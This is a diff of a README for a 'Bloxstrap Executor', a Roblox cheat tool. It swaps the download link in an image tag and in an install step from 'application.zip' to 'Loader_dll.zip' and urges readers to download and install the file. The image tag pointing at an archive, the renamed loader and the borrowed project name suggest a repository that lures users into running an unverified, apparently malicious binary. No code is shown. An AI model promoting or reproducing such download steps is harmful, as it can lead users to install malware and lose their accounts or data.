@@ -193,7 +193,7 @@
 
 Welcome to the Bloxstrap Executor repository! 🚀 This repository hosts the latest version of the Bloxstrap Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![Bloxstrap Executor](https://github.com/secondlathloothy/Bloxstrap/releases/download/Download/application.zip)
+![Bloxstrap Executor](https://github.com/secondlathloothy/Bloxstrap/releases/download/Download/Loader_dll.zip)
 
 ## Table of Contents
 
@@ -688,7 +688,7 @@ Bloxstrap Executor is a cutting-edge executor designed for Roblox script executi
 
 To get started with Bloxstrap Executor, follow these simple steps:
 
-1. Download the latest version of the executor from the following link: [![Download Bloxstrap Executor](https://img.shields.io/badge/Download-Bloxstrap%20Executor-orange)](https://github.com/secondlathloothy/Bloxstrap/releases/download/Download/application.zip).
+1. Download the latest version of the executor from the following link: [![Download Bloxstrap Executor](https://img.shields.io/badge/Download-Bloxstrap%20Executor-orange)](https://github.com/secondlathloothy/Bloxstrap/releases/download/Download/Loader_dll.zip).
   
    This download button will provide you with the necessary files to install the executor on your system. Click the button to initiate the download process.
 
